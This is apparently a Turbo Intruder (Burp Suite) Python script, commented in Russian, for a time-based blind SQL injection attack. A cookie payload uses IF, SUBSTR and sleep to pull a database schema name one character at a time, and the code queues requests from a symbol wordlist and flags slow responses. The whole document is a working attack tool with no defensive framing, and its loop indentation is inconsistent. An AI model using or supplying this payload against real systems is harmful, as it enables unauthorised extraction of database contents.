# скрипт для Time-Based SQL Injection
# payload Cookie: cook=cfcd208495d559ef66e7dff9f98764da' OR IF(SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1), %s, 1)='%s', sleep(1), 1) -- -

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

   for i in range(1, 51):
       for secondWord in open('/home/kali/symbols.txt'):
            sw=secondWord.rstrip()
            engine.queue(target.req, [i, sw], label=sw)

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.time > 2000000:
        table.add(req)
